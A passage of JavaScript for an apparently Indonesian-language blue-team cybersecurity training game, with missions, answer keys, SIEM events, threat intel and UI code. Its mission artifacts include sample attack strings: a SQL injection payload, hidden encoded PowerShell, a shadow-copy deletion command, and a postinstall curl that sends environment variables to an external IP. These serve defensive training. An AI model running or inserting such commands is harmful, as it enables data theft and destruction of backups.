const STORAGE_KEY = 'cda_sec_os_v4_3';

const CAREER_STAGES = [
  { id: 'intern', title: 'SECURITY INTERN', minLevel: 1, focus: 'Triase dasar phishing, kebersihan sandi, dan pembacaan log awal.' },
  { id: 'soc1', title: 'SOC ANALYST TIER 1', minLevel: 3, focus: 'Monitoring alert SIEM 24/7, validasi IOC, dan eskalasi insiden.' },
  { id: 'soc2', title: 'SOC ANALYST TIER 2', minLevel: 5, focus: 'Investigasi mendalam insiden jaringan, forensik endpoint, dan containment.' },
  { id: 'ir', title: 'INCIDENT RESPONDER', minLevel: 8, focus: 'Eksekusi siklus NIST SP 800-61 (Containment, Eradication, Recovery).' },
  { id: 'hunter', title: 'THREAT HUNTER', minLevel: 11, focus: 'Perburuan proaktif TTP MITRE ATT&CK dan korelasi anomali tersembunyi.' },
  { id: 'arch', title: 'SECURITY ARCHITECT', minLevel: 15, focus: 'Perancangan Zero Trust, segmentasi jaringan, dan hardening infrastruktur.' },
  { id: 'ciso', title: 'CISO', minLevel: 20, focus: 'Tata kelola risiko eksekutif, kepatuhan regulasi, dan strategi ketahanan siber.' }
];

const CERTIFICATIONS = [
  { id: 'google-cyber', title: 'Google Cybersecurity Certificate', issuer: 'Google Career', reqLevel: 1, reqMissions: 1 },
  { id: 'sec-plus', title: 'CompTIA Security+ (SY0-701)', issuer: 'CompTIA', reqLevel: 3, reqMissions: 3 },
  { id: 'btl1', title: 'Blue Team Level 1 (BTL1)', issuer: 'Security Blue Team', reqLevel: 5, reqMissions: 5 },
  { id: 'sc-900', title: 'Microsoft Security (SC-900)', issuer: 'Microsoft', reqLevel: 7, reqMissions: 7 },
  { id: 'sc-200', title: 'Microsoft SOC Analyst (SC-200)', issuer: 'Microsoft', reqLevel: 10, reqMissions: 9 },
  { id: 'cissp', title: 'ISC2 CISSP Executive Track', issuer: 'ISC2', reqLevel: 15, reqMissions: 12 }
];

const BUILTIN_MISSIONS = [
  {
    id: 'M01',
    title: 'Spear-Phishing Eksekutif (BEC)',
    category: 'phishing',
    difficulty: 'Beginner',
    xp: 120,
    sp: 1,
    frameworks: { nist: 'PR.AT-1 / DE.CM-4', sp800: 'Detection & Analysis', cis: 'CIS Control 9', mitre: 'T1566.001', cwe: 'CWE-290', cvss: '7.5 (High)' },
    briefing: 'Divisi Keuangan menerima email mendesak mengatasnamakan CFO meminta transfer dana vendor baru. Periksa header autentikasi email di bawah.',
    artifact: 'From: "CFO Office" <cfo@corp-internal.co>\nReply-To: settlement-desk@external-mail-relay.net\nAuthentication-Results: spf=fail (sender IP 185.220.101.45); dkim=none; dmarc=fail',
    question: 'Tindakan defensif pertama yang paling tepat berdasarkan NIST SP 800-61 adalah:',
    options: [
      'Membalas email tersebut untuk menanyakan nomor telepon pengirim.',
      'Karantina email di seluruh mailbox organisasi, blokir domain Reply-To, dan beri peringatan tim Keuangan.',
      'Menonaktifkan seluruh server email perusahaan selama 24 jam.'
    ],
    answer: 1,
    explanation: 'SPF dan DMARC gagal disertai perbedaan domain Reply-To menandakan spoofing BEC. Karantina massal dan pemblokiran indikator mencegah korban tambahan.'
  },
  {
    id: 'M02',
    title: 'Brute-Force SSH & Password Spraying',
    category: 'soc',
    difficulty: 'Beginner',
    xp: 130,
    sp: 1,
    frameworks: { nist: 'DE.AE-2 / RS.MI-1', sp800: 'Containment', cis: 'CIS Control 6', mitre: 'T1110.003', cwe: 'CWE-307', cvss: '8.1 (High)' },
    briefing: 'Sensor AUTH mencatat 420 percobaan login SSH gagal terhadap 35 akun berbeda dari satu IP publik dalam 4 menit, diikuti satu sesi berhasil.',
    artifact: 'May 14 02:14:09 bastion-01 sshd[8821]: Failed password for admin from 91.240.118.172 port 51204\nMay 14 02:17:41 bastion-01 sshd[8894]: Accepted password for deploy_ops from 91.240.118.172 port 51988',
    question: 'Langkah containment paling efektif saat ini adalah:',
    options: [
      'Blokir IP 91.240.118.172 di firewall perimeter, cabut sesi aktif deploy_ops, dan wajibkan rotasi kredensial + MFA.',
      'Menghapus file /var/log/auth.log agar alert tidak berulang.',
      'Mengubah port SSH ke 2222 tanpa memutus sesi aktif penyerang.'
    ],
    answer: 0,
    explanation: 'Penyerang sudah berhasil masuk ke akun deploy_ops. Sesi aktif harus segera diputus, IP diblokir, dan autentikasi berbasis password diganti kunci SSH + MFA.'
  },
  {
    id: 'M03',
    title: 'Eksfiltrasi DNS Tunneling',
    category: 'network',
    difficulty: 'Intermediate',
    xp: 160,
    sp: 1,
    frameworks: { nist: 'DE.CM-1 / RS.MI-2', sp800: 'Containment & Eradication', cis: 'CIS Control 13', mitre: 'T1071.004', cwe: 'CWE-200', cvss: '8.2 (High)' },
    briefing: 'Telemetri DNS memperlihatkan lonjakan kueri TXT dengan subdomain berentropi tinggi menuju domain eksternal yang baru didaftarkan.',
    artifact: 'SRC=10.20.4.55 QUERY_TYPE=TXT QNAME=4a6f686e5f446f655f53534e393932.ns1.update-billing-auth.net',
    question: 'Apa indikasi teknis utama pada log DNS tersebut?',
    options: [
      'Pembaruan sertifikat TLS normal dari CDN.',
      'Payload data yang di-encode heksadesimal pada subdomain untuk eksfiltrasi lewat DNS tunneling.',
      'Kesalahan konfigurasi DHCP internal.'
    ],
    answer: 1,
    explanation: 'String 4a6f686e... adalah representasi hex ASCII dari data sensitif yang diselundupkan melalui kueri DNS TXT.'
  },
  {
    id: 'M04',
    title: 'Eksekusi PowerShell Terenkripsi (EncodedCommand)',
    category: 'malware',
    difficulty: 'Intermediate',
    xp: 170,
    sp: 2,
    frameworks: { nist: 'DE.CM-5 / RS.AN-1', sp800: 'Analysis & Containment', cis: 'CIS Control 10', mitre: 'T1059.001', cwe: 'CWE-506', cvss: '8.8 (High)' },
    briefing: 'EDR mendeteksi proses Microsoft Word (WINWORD.EXE) meluncurkan powershell.exe dengan flag tersembunyi.',
    artifact: 'Parent: WINWORD.EXE -> Child: powershell.exe -NoP -W Hidden -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==',
    question: 'Tindakan respons insiden yang tepat pada host terdampak adalah:',
    options: [
      'Isolasi host dari jaringan melalui konsol EDR, ambil dump memori/artefak skrip, lalu bersihkan persistensi.',
      'Restart komputer pengguna dan biarkan pengguna melanjutkan pekerjaan.',
      'Menambahkan WINWORD.EXE ke daftar pengecualian antivirus.'
    ],
    answer: 0,
    explanation: 'Proses Office yang memicu PowerShell terenkripsi adalah pola eksekusi makro berbahaya. Host wajib diisolasi sebelum terjadi pergerakan lateral.'
  },
  {
    id: 'M05',
    title: 'Privilege Escalation via SUID Misconfiguration',
    category: 'iam',
    difficulty: 'Intermediate',
    xp: 165,
    sp: 1,
    frameworks: { nist: 'PR.AC-4 / PR.IP-1', sp800: 'Eradication & Hardening', cis: 'CIS Control 5', mitre: 'T1548.001', cwe: 'CWE-269', cvss: '7.8 (High)' },
    briefing: 'Audit integritas file menemukan biner utilitas sistem pada server Linux memiliki bit izin SUID yang tidak semestinya.',
    artifact: '-rwsr-xr-x 1 root root 54216 May 12 10:11 /usr/bin/find',
    question: 'Mengapa izin -rwsr-xr-x pada /usr/bin/find berisiko kritis?',
    options: [
      'Karena file tersebut memakan kapasitas disk berlebih.',
      'Karena pengguna non-root dapat menjalankan perintah melalui parameter -exec dengan hak akses root.',
      'Karena biner tersebut tidak bisa dijalankan oleh administrator.'
    ],
    answer: 1,
    explanation: 'Bit SUID (s) membuat biner berjalan sebagai pemiliknya (root). Menghapus bit SUID (chmod u-s /usr/bin/find) menutup celah eskalasi hak akses.'
  },
  {
    id: 'M06',
    title: 'Kebocoran API Key pada Repositori Publik',
    category: 'iam',
    difficulty: 'Beginner',
    xp: 140,
    sp: 1,
    frameworks: { nist: 'PR.DS-5 / RS.MI-3', sp800: 'Containment', cis: 'CIS Control 3', mitre: 'T1552.001', cwe: 'CWE-798', cvss: '8.6 (High)' },
    briefing: 'Pemindai rahasia (secret scanner) mendeteksi token akses cloud production ikut ter-commit ke repositori publik.',
    artifact: 'COMMIT 9f2c81a: const AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";',
    question: 'Urutan remediasi yang benar adalah:',
    options: [
      'Hanya melakukan git commit baru yang menghapus baris tersebut.',
      'Segera revoke/rotasi token di IAM cloud, audit log akses token tersebut, lalu bersihkan riwayat git.',
      'Mengubah repositori menjadi private tanpa mengganti token.'
    ],
    answer: 1,
    explanation: 'Begitu kredensial terekspos ke publik, anggap sudah dikompromikan. Rotasi kunci dan audit CloudTrail wajib dilakukan terlebih dahulu.'
  },
  {
    id: 'M07',
    title: 'Eksploitasi SQL Injection pada Portal Login',
    category: 'network',
    difficulty: 'Intermediate',
    xp: 180,
    sp: 2,
    frameworks: { nist: 'PR.PT-4 / DE.CM-7', sp800: 'Containment & Patch', cis: 'CIS Control 16', mitre: 'T1190', cwe: 'CWE-89', cvss: '9.8 (Critical)' },
    briefing: 'WAF mencatat payload bypass autentikasi dan ekstraksi tabel pengguna pada endpoint /api/v1/login.',
    artifact: 'POST /api/v1/login HTTP/1.1 | Payload: {"username":"admin\' UNION SELECT 1,table_name FROM information_schema.tables--","password":"x"}',
    question: 'Perbaikan permanen di sisi kode aplikasi (remediasi CWE-89) adalah:',
    options: [
      'Menggunakan Parameterized Queries / Prepared Statements dan validasi input ketat.',
      'Menyembunyikan pesan error database di halaman HTML saja.',
      'Memblokir karakter tanda petik tunggal hanya lewat JavaScript di browser.'
    ],
    answer: 0,
    explanation: 'Prepared statements memisahkan struktur perintah SQL dari data input pengguna sehingga payload tidak pernah dieksekusi sebagai kode.'
  },
  {
    id: 'M08',
    title: 'Ransomware Pre-Encryption Shadow Copy Deletion',
    category: 'malware',
    difficulty: 'Advanced',
    xp: 220,
    sp: 2,
    frameworks: { nist: 'RS.MI-1 / RC.RP-1', sp800: 'Containment & Recovery', cis: 'CIS Control 11', mitre: 'T1490', cwe: 'CWE-404', cvss: '9.3 (Critical)' },
    briefing: 'Alert EDR berprioritas tinggi muncul ketika utilitas vssadmin dijalankan untuk menghapus seluruh backup volume lokal.',
    artifact: 'Process: cmd.exe /c vssadmin.exe delete shadows /all /quiet && wmic shadowcopy delete',
    question: 'Prioritas utama tim Incident Response dalam 3 menit pertama adalah:',
    options: [
      'Isolasi jaringan segmen terdampak, matikan jalur SMB/RDP lateral, dan verifikasi integritas immutable offline backup.',
      'Membayar tebusan untuk mendapatkan kunci dekripsi secepatnya.',
      'Menjalankan defragmentasi disk pada server file.'
    ],
    answer: 0,
    explanation: 'Penghapusan Volume Shadow Copy adalah tahap akhir sebelum enkripsi massal ransomware. Isolasi segmen dan perlindungan backup offline adalah kunci pemulihan.'
  },
  {
    id: 'M09',
    title: 'Anomali Login Impossible Travel VPN',
    category: 'soc',
    difficulty: 'Intermediate',
    xp: 165,
    sp: 1,
    frameworks: { nist: 'DE.AE-3 / PR.AC-7', sp800: 'Detection & Analysis', cis: 'CIS Control 6', mitre: 'T1078', cwe: 'CWE-287', cvss: '7.6 (High)' },
    briefing: 'Sistem korelasi identitas mendeteksi satu akun manajer login VPN dari Jakarta dan 12 menit kemudian dari Eropa Timur.',
    artifact: '09:00 WIB -> User: r.pratama | IP: 103.144.x.x (Jakarta, ID) | MFA: Push Approved\n09:12 WIB -> User: r.pratama | IP: 194.26.135.88 (Eastern Europe) | Session Token Reused',
    question: 'Penyebab paling mungkin sesi kedua berhasil tanpa tantangan MFA baru adalah:',
    options: [
      'Pencurian cookie sesi / token OAuth (Session Hijacking / AiTM).',
      'Pengguna menggunakan pesawat supersonik.',
      'Sinkronisasi NTP server sedang lambat.'
    ],
    answer: 0,
    explanation: 'Serangan Adversary-in-the-Middle (AiTM) mencuri token sesi setelah MFA disetujui. Solusinya adalah mencabut seluruh refresh token aktif (Revoke Sessions).'
  },
  {
    id: 'M10',
    title: 'Zero-Day RCE Perimeter & Virtual Patching',
    category: 'governance',
    difficulty: 'Advanced',
    xp: 240,
    sp: 2,
    frameworks: { nist: 'ID.RA-1 / PR.IP-12', sp800: 'Preparation & Containment', cis: 'CIS Control 7', mitre: 'T1190', cwe: 'CWE-94', cvss: '9.8 (Critical)' },
    briefing: 'Vendor perangkat gateway VPN merilis advisory kerentanan RCE kritis (CVSS 9.8), namun patch resmi baru tersedia 48 jam lagi.',
    artifact: 'ADVISORY-2026-09: Unauthenticated RCE via /sslvpn/portal/api endpoint. Active exploitation observed in the wild.',
    question: 'Strategi mitigasi sementara (compensating control) terbaik sebelum patch resmi terpasang adalah:',
    options: [
      'Terapkan Virtual Patching di WAF/IPS, batasi akses portal VPN hanya untuk IP whitelist/GeoIP, dan tingkatkan logging.',
      'Biarkan layanan berjalan normal sambil menunggu jadwal maintenance bulan depan.',
      'Matikan firewall agar trafik VPN tidak terhambat.'
    ],
    answer: 0,
    explanation: 'Virtual patching pada WAF/IPS serta pembatasan permukaan serangan mengurangi risiko eksploitasi secara langsung selama masa tunggu patch vendor.'
  },
  {
    id: 'M11',
    title: 'Penyusunan Board Risk Report & Anggaran Zero Trust',
    category: 'governance',
    difficulty: 'Executive',
    xp: 280,
    sp: 3,
    frameworks: { nist: 'GV.RM-1 / ID.GV-1', sp800: 'Executive Governance', cis: 'CIS Control 1', mitre: 'M1030', cwe: 'N/A', cvss: 'Strategic' },
    briefing: 'Dewan Direksi meminta justifikasi investasi arsitektur Zero Trust dan penguatan SOC setelah meningkatnya serangan rantai pasok di sektor industri.',
    artifact: 'Current Metrics: MTTD = 48 mins | Legacy Flat Network = 72% | Unpatched Critical Assets = 14%',
    question: 'Pendekatan komunikasi CISO yang paling efektif kepada Dewan Direksi adalah:',
    options: [
      'Menyajikan dampak finansial risiko bisnis, target penurunan MTTD/MTTR, dan peta jalan mitigasi bertahap berbasis NIST CSF.',
      'Membacakan ribuan baris log mentah firewall selama rapat direksi.',
      'Menyatakan bahwa perusahaan 100% kebal terhadap semua serangan siber.'
    ],
    answer: 0,
    explanation: 'Sebagai CISO, risiko teknis diterjemahkan menjadi metrik ketahanan bisnis yang terukur dengan target pengurangan eksposur yang jelas.'
  },
  {
    id: 'M12',
    title: 'Supply Chain Compromise pada Dependensi Build CI/CD',
    category: 'malware',
    difficulty: 'Executive',
    xp: 300,
    sp: 3,
    frameworks: { nist: 'GV.SC-1 / DE.CM-8', sp800: 'Containment & Eradication', cis: 'CIS Control 2', mitre: 'T1195.002', cwe: 'CWE-829', cvss: '9.1 (Critical)' },
    briefing: 'Pipeline CI/CD mengunduh paket pihak ketiga versi terbaru yang menyisipkan skrip post-install untuk mencuri environment variables.',
    artifact: 'npm install @vendor/telemetry-helper@2.4.1 -> postinstall: curl -s http://45.133.1.92/collect -d "$(env)"',
    question: 'Kontrol pencegahan jangka panjang terbaik pada pipeline CI/CD adalah:',
    options: [
      'Pinning versi dependensi dengan lockfile + verifikasi checksum/SBOM, serta isolasi runner build dengan kredensial berumur pendek (OIDC).',
      'Menjalankan seluruh proses build menggunakan akun root tanpa batas jaringan.',
      'Menonaktifkan seluruh pengujian keamanan otomatis agar deploy lebih cepat.'
    ],
    answer: 0,
    explanation: 'Lockfile verification, Software Bill of Materials (SBOM), dan kredensial ephemeral OIDC memutus rantai serangan supply chain pada tahap build.'
  }
];

const INITIAL_SIEM_EVENTS = [
  { id: 'EVT-101', time: '09:12:04', source: 'AUTH', severity: 'critical', title: 'Multiple Failed MFA Push + Login from TOR Exit Node (185.220.101.45)', malicious: true },
  { id: 'EVT-102', time: '09:14:22', source: 'DNS', severity: 'warning', title: 'High-Entropy TXT Query Burst to update-billing-auth.net', malicious: true },
  { id: 'EVT-103', time: '09:15:10', source: 'FIREWALL', severity: 'info', title: 'Scheduled Vulnerability Scanner Probe from Internal Nessus Sensor (10.10.2.15)', malicious: false },
  { id: 'EVT-104', time: '09:18:45', source: 'ENDPOINT', severity: 'critical', title: 'WINWORD.EXE Spawned Encoded PowerShell Payload on FIN-PC-09', malicious: true },
  { id: 'EVT-105', time: '09:20:03', source: 'VPN', severity: 'info', title: 'Authorized Certificate Renewal for Remote Engineering Gateway', malicious: false }
];

const EXTRA_SIEM_POOL = [
  { source: 'ENDPOINT', severity: 'critical', title: 'LSASS Memory Access Attempt by Unsigned Binary temp_upd.exe', malicious: true },
  { source: 'FIREWALL', severity: 'warning', title: 'Outbound SMB (TCP/445) Blocked to External IP 45.133.1.92', malicious: true },
  { source: 'AUTH', severity: 'info', title: 'Automated Service Account Kerberos TGT Renewal (svc_backup)', malicious: false },
  { source: 'DNS', severity: 'critical', title: 'Beaconing Pattern (60s interval) to c2-sync-node.xyz', malicious: true },
  { source: 'VPN', severity: 'warning', title: 'Impossible Travel Login Attempt Blocked by Conditional Access Policy', malicious: true }
];

const THREAT_INTEL_DB = {
  '185.220.101.45': {
    type: 'IPv4 Address',
    verdict: 'MALICIOUS (Confidence: 98%)',
    actor: 'UNC-4821 / Credential Harvesting Infra',
    mitre: 'T1078 (Valid Accounts) • T1090.003 (Multi-hop Proxy)',
    advice: 'Blokir pada perimeter firewall/WAF dan cabut sesi aktif dari IP sumber ini.'
  },
  'update-billing-auth.net': {
    type: 'Domain Name',
    verdict: 'MALICIOUS (Confidence: 95%)',
    actor: 'FinPhish / DNS Exfiltration C2',
    mitre: 'T1566.002 (Spearphishing Link) • T1071.004 (DNS Tunneling)',
    advice: 'Sinkhole domain di DNS resolver internal dan periksa host yang melakukan kueri dalam 7 hari terakhir.'
  },
  '45.133.1.92': {
    type: 'IPv4 Address',
    verdict: 'MALICIOUS (Confidence: 96%)',
    actor: 'CI/CD Dropper Collector',
    mitre: 'T1195.002 (Supply Chain Compromise)',
    advice: 'Putus koneksi keluar dari build runner dan rotasi seluruh secret CI/CD.'
  },
  '10.10.2.15': {
    type: 'Internal Sensor IPv4',
    verdict: 'BENIGN / AUTHORIZED ASSET',
    actor: 'Internal Vulnerability Management Scanner',
    mitre: 'Authorized Security Audit',
    advice: 'Tandai sebagai pengecualian terjadwal pada aturan korelasi port scan internal.'
  }
};

const THREAT_CAMPAIGNS = [
  {
    id: 'TI-01',
    name: 'Operation ShadowInvoice (BEC & AiTM)',
    severity: 'CRITICAL',
    ioc: '185.220.101.45',
    mitre: 'T1566 • T1539',
    summary: 'Kampanye phishing menggunakan proxy reverse-tunnel untuk melewati MFA berbasis push dan mencuri token sesi Microsoft 365 / Google Workspace.'
  },
  {
    id: 'TI-02',
    name: 'CobaltWhisper DNS Exfiltration',
    severity: 'HIGH',
    ioc: 'update-billing-auth.net',
    mitre: 'T1071.004 • T1048',
    summary: 'Malware tahap kedua memanfaatkan kueri DNS TXT berentropi tinggi untuk menyelundupkan kredensial dan dokumen secara perlahan.'
  },
  {
    id: 'TI-03',
    name: 'NpmGhost Build Runner Harvester',
    severity: 'HIGH',
    ioc: '45.133.1.92',
    mitre: 'T1195.002 • T1552',
    summary: 'Paket dependensi tiruan (typosquatting) mengekstrak environment variables dari pipeline CI/CD selama tahap instalasi.'
  }
];

const QUIZ_QUESTIONS = [
  {
    topic: 'incident',
    q: 'Berdasarkan NIST SP 800-61, apa urutan fase utama dalam siklus Incident Response?',
    options: [
      'Preparation → Detection & Analysis → Containment, Eradication & Recovery → Post-Incident Activity',
      'Eradication → Preparation → Containment → Post-Incident Activity',
      'Detection → Recovery → Preparation → Eradication'
    ],
    answer: 0,
    explanation: 'NIST SP 800-61 menetapkan 4 fase berurutan dimulai dari Preparation hingga Post-Incident Activity (Lessons Learned).'
  },
  {
    topic: 'network',
    q: 'Protokol email mana yang menggabungkan SPF dan DKIM untuk menentukan kebijakan penolakan email palsu?',
    options: ['SNMPv3', 'DMARC', 'RADIUS'],
    answer: 1,
    explanation: 'DMARC memvalidasi keselarasan (alignment) SPF dan DKIM serta menginstruksikan server penerima untuk monitor, quarantine, atau reject.'
  },
  {
    topic: 'soc',
    q: 'Apa arti dari metrik MTTR dalam operasional Security Operations Center (SOC)?',
    options: [
      'Mean Time to Respond / Recover dari sebuah insiden keamanan',
      'Maximum Total Traffic Routed pada firewall',
      'Managed Threat Token Registry'
    ],
    answer: 0,
    explanation: 'MTTR mengukur kecepatan rata-rata tim SOC dalam merespons, membendung, dan memulihkan sistem setelah insiden terdeteksi.'
  },
  {
    topic: 'crypto',
    q: 'Manakah algoritma hashing yang direkomendasikan untuk penyimpanan password modern dengan salt?',
    options: ['MD5', 'SHA-1', 'Argon2id atau bcrypt'],
    answer: 2,
    explanation: 'Argon2id dan bcrypt dirancang tahan terhadap serangan brute-force GPU/ASIC berkat parameter memory-hard dan work factor.'
  },
  {
    topic: 'governance',
    q: 'Prinsip keamanan yang membatasi hak akses pengguna hanya sebatas yang diperlukan untuk tugasnya disebut:',
    options: ['Security through Obscurity', 'Principle of Least Privilege (PoLP)', 'Split Tunneling'],
    answer: 1,
    explanation: 'Least Privilege meminimalkan dampak kompromi akun dengan membatasi izin akses ke tingkat minimum yang dibutuhkan.'
  },
  {
    topic: 'soc',
    q: 'Pada matriks MITRE ATT&CK, teknik "T1059.001" merujuk pada aktivitas apa?',
    options: ['Command and Scripting Interpreter: PowerShell', 'Phishing: Spearphishing Attachment', 'Valid Accounts: Cloud Accounts'],
    answer: 0,
    explanation: 'T1059.001 adalah sub-teknik penyalahgunaan PowerShell untuk eksekusi skrip dan perintah berbahaya.'
  }
];

const SKILL_NODES = [
  { id: 'log_triage', name: 'SIEM Log Correlation', max: 5, desc: 'Mempercepat deteksi anomali lintas sensor Auth, DNS, dan Firewall.' },
  { id: 'phish_forensics', name: 'Email & Header Forensics', max: 5, desc: 'Meningkatkan akurasi analisis SPF, DKIM, DMARC, dan payload lampiran.' },
  { id: 'net_defense', name: 'Perimeter & Zero Trust', max: 5, desc: 'Mengoptimalkan aturan ACL firewall, segmentasi VLAN, dan VPN hardening.' },
  { id: 'edr_triage', name: 'Endpoint & Malware Triage', max: 5, desc: 'Mengidentifikasi pohon proses mencurigakan dan teknik persistensi host.' },
  { id: 'threat_intel', name: 'CTI & MITRE Mapping', max: 5, desc: 'Memperdalam korelasi IOC dan profil aktor ancaman.' },
  { id: 'grc_lead', name: 'GRC & CISO Governance', max: 5, desc: 'Menyelaraskan metrik risiko teknis dengan kepatuhan NIST CSF & ISO 27001.' }
];

const ACHIEVEMENTS_LIST = [
  { id: 'first_blood', title: 'First Containment', desc: 'Menyelesaikan misi pertahanan pertama.', check: (s) => s.completedMissions.length >= 1 },
  { id: 'analyst_5', title: 'SOC Veteran', desc: 'Menyelesaikan minimal 5 misi Blue Team.', check: (s) => s.completedMissions.length >= 5 },
  { id: 'siem_master', title: 'Alert Triager', desc: 'Menangani minimal 3 event di Mini SIEM.', check: (s) => s.siemHandled >= 3 },
  { id: 'lab_rat', title: 'Hands-On Defender', desc: 'Menyelesaikan minimal 2 Cyber Labs interaktif.', check: (s) => s.completedLabs.length >= 2 },
  { id: 'quiz_sharp', title: 'NIST Scholar', desc: 'Menjawab benar minimal 3 soal kuis.', check: (s) => s.quizCorrect >= 3 },
  { id: 'skill_up', title: 'Specialist Upgrade', desc: 'Mengalokasikan Skill Point di Skill Tree.', check: (s) => Object.values(s.unlockedSkills).some((v) => v > 0) },
  { id: 'lvl_5', title: 'Tier 2 Promotion', desc: 'Mencapai Level 5 (SOC Analyst Tier 2).', check: (s) => s.level >= 5 },
  { id: 'master_10', title: 'Master Cyber Defender', desc: 'Menyelesaikan 10 misi pertahanan.', check: (s) => s.completedMissions.length >= 10 }
];

function createDefaultState() {
  return {
    schemaVersion: '4.3',
    operativeName: '',
    track: 'soc',
    xp: 0,
    level: 1,
    sp: 1,
    streak: 1,
    lastActiveDate: new Date().toISOString().slice(0, 10),
    completedMissions: [],
    socScore: 0,
    siemHandled: 0,
    siemFalsePositives: 0,
    quizAnswered: 0,
    quizCorrect: 0,
    unlockedSkills: {},
    completedLabs: [],
    dailyCompletedDate: '',
    activityLog: ['Inisialisasi terminal CDA // SEC-OS v4.3 selesai.'],
    audioEnabled: true
  };
}

let state = loadState();
let siemEvents = [...INITIAL_SIEM_EVENTS];
let currentLab = 'phishing';
let currentQuizIndex = 0;
let hardenedNodes = { fw: false, vpn: false, db: false, ad: false };

function loadState() {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (!raw) return createDefaultState();
    const parsed = JSON.parse(raw);
    return { ...createDefaultState(), ...parsed };
  } catch {
    return createDefaultState();
  }
}

function saveState() {
  try {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(state));
  } catch {}
}

function playTone(type = 'click') {
  if (!state.audioEnabled) return;
  try {
    const AudioCtx = window.AudioContext || window.webkitAudioContext;
    if (!AudioCtx) return;
    const ctx = new AudioCtx();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);

    const now = ctx.currentTime;
    if (type === 'success') {
      osc.type = 'triangle';
      osc.frequency.setValueAtTime(520, now);
      osc.frequency.exponentialRampToValueAtTime(880, now + 0.16);
      gain.gain.setValueAtTime(0.08, now);
      gain.gain.exponentialRampToValueAtTime(0.001, now + 0.18);
      osc.start(now);
      osc.stop(now + 0.18);
    } else if (type === 'alert') {
      osc.type = 'sawtooth';
      osc.frequency.setValueAtTime(220, now);
      osc.frequency.linearRampToValueAtTime(160, now + 0.18);
      gain.gain.setValueAtTime(0.07, now);
      gain.gain.exponentialRampToValueAtTime(0.001, now + 0.2);
      osc.start(now);
      osc.stop(now + 0.2);
    } else {
      osc.type = 'sine';
      osc.frequency.setValueAtTime(640, now);
      gain.gain.setValueAtTime(0.04, now);
      gain.gain.exponentialRampToValueAtTime(0.001, now + 0.06);
      osc.start(now);
      osc.stop(now + 0.06);
    }
  } catch {}
}

function showToast(message, variant = 'success') {
  const container = document.getElementById('toast-container');
  if (!container) return;
  const el = document.createElement('div');
  el.className = `toast ${variant}`;
  el.textContent = message;
  container.appendChild(el);
  setTimeout(() => el.remove(), 3400);
}

function logActivity(text) {
  const stamp = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
  state.activityLog.unshift(`[${stamp}] ${text}`);
  if (state.activityLog.length > 8) state.activityLog.length = 8;
}

function getCurrentRank() {
  let current = CAREER_STAGES[0];
  for (const stage of CAREER_STAGES) {
    if (state.level >= stage.minLevel) current = stage;
  }
  return current;
}

function grantXP(amount, spBonus = 0, reason = '') {
  state.xp += amount;
  state.sp += spBonus;
  state.socScore += amount;

  let leveledUp = false;
  while (state.xp >= state.level * 250) {
    state.xp -= state.level * 250;
    state.level += 1;
    state.sp += 1;
    leveledUp = true;
  }

  if (reason) logActivity(`${reason} (+${amount} XP)`);
  if (leveledUp) {
    const rank = getCurrentRank();
    logActivity(`Promosi Level ${state.level} — ${rank.title}`);
    showToast(`🎉 Naik ke Level ${state.level} (${rank.title})! +1 SP`, 'success');
  }
  saveState();
  renderAll();
}

function escapeHTML(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function renderHUD() {
  const rank = getCurrentRank();
  const nextXp = state.level * 250;
  const pct = Math.min(100, Math.round((state.xp / nextXp) * 100));

  const nameEl = document.getElementById('hud-player-name');
  const rankEl = document.getElementById('hud-rank');
  const lvlEl = document.getElementById('hud-level');
  const xpEl = document.getElementById('hud-xp');
  const xpBar = document.getElementById('hud-xp-bar');
  const spEl = document.getElementById('hud-sp');
  const streakEl = document.getElementById('hud-streak');
  const audioBtn = document.getElementById('btn-toggle-audio');

  if (nameEl) nameEl.textContent = state.operativeName || 'OPERATIVE';
  if (rankEl) rankEl.textContent = rank.title;
  if (lvlEl) lvlEl.textContent = `LVL ${state.level}`;
  if (xpEl) xpEl.textContent = `${state.xp} / ${nextXp}`;
  if (xpBar) xpBar.style.width = `${pct}%`;
  if (spEl) spEl.textContent = String(state.sp);
  if (streakEl) streakEl.textContent = `${state.streak}d`;
  if (audioBtn) audioBtn.textContent = state.audioEnabled ? '🔊' : '🔇';
}

function renderDashboard() {
  const kpiMissions = document.getElementById('kpi-missions');
  const kpiScore = document.getElementById('kpi-score');
  const kpiContainment = document.getElementById('kpi-containment');
  const kpiAccuracy = document.getElementById('kpi-accuracy');

  if (kpiMissions) kpiMissions.textContent = `${state.completedMissions.length} / ${BUILTIN_MISSIONS.length}`;
  if (kpiScore) kpiScore.textContent = String(state.socScore);

  const containment = state.siemHandled === 0
    ? 100
    : Math.max(0, Math.round(((state.siemHandled - state.siemFalsePositives) / state.siemHandled) * 100));
  if (kpiContainment) kpiContainment.textContent = `${containment}%`;

  const accuracy = state.quizAnswered === 0
    ? 0
    : Math.round((state.quizCorrect / state.quizAnswered) * 100);
  if (kpiAccuracy) kpiAccuracy.textContent = `${accuracy}%`;

  const currentRank = getCurrentRank();
  const stageIdx = CAREER_STAGES.findIndex((s) => s.id === currentRank.id);
  const progressLabel = document.getElementById('career-progress-label');
  if (progressLabel) progressLabel.textContent = `Stage ${stageIdx + 1} / ${CAREER_STAGES.length}`;

  const stepsGrid = document.getElementById('career-steps-grid');
  if (stepsGrid) {
    stepsGrid.innerHTML = CAREER_STAGES.map((stage) => {
      const unlocked = state.level >= stage.minLevel;
      const isCurrent = stage.id === currentRank.id;
      return `
        <div class="career-node ${unlocked ? 'unlocked' : ''} ${isCurrent ? 'current' : ''}">
          <div class="mono-text" style="font-size:0.68rem;">LVL ${stage.minLevel}+</div>
          <strong>${stage.title}</strong>
        </div>
      `;
    }).join('');
  }

  const today = new Date().toISOString().slice(0, 10);
  const dailyBox = document.getElementById('daily-challenge-box');
  if (dailyBox) {
    if (state.dailyCompletedDate === today) {
